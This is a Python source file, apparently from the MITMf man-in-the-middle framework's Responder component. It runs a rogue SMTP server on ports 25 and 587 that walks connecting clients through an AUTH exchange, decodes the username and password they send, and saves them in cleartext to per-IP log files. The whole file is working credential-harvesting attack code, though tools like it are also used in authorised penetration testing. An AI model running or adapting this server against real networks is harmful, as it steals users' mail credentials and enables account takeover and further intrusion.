import logging
import threading

from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
from base64 import b64decode
from SMTPPackets import *
from core.responder.common import *

mitmf_logger = logging.getLogger("mitmf")

class SMTPServer():

	def serve_thread_tcp(self, port):
		try:
			server = ThreadingTCPServer(("0.0.0.0", port), ESMTP)
			server.serve_forever()
		except Exception as e:
			mitmf_logger.error("[SMTPServer] Error starting TCP server on port {}: {}".format(port, e))

	#Function name self-explanatory
	def start(self):
		mitmf_logger.debug("[SMTPServer] online")
		t1 = threading.Thread(name="ESMTP-25", target=self.serve_thread_tcp, args=(25,))
		t2 = threading.Thread(name="ESMTP-587", target=self.serve_thread_tcp, args=(587,))
		
		for t in [t1, t2]:
			t.setDaemon(True)
			t.start()

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)

#ESMTP server class.
class ESMTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(SMTPGreating()))
			data = self.request.recv(1024)
			if data[0:4] == "EHLO":
				self.request.send(str(SMTPAUTH()))
				data = self.request.recv(1024)
			if data[0:4] == "AUTH":
				self.request.send(str(SMTPAUTH1()))
				data = self.request.recv(1024)
				if data:
					Username = b64decode(data[:len(data)-2])
					self.request.send(str(SMTPAUTH2()))
					data = self.request.recv(1024)
					if data:
						Password = b64decode(data[:len(data)-2])
						Outfile = "./logs/responder/SMTP-Clear-Text-Password-"+self.client_address[0]+".txt"
						WriteData(Outfile,Username+":"+Password, Username+":"+Password)
						#print "[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password)
						mitmf_logger.info("[SMTPServer] {} SMTP User: {} Pass:{} ".format(self.client_address[0],Username,Password))

		except Exception as e:
			mitmf_logger.error("[SMTPServer] Error handling request: {}".format(e))
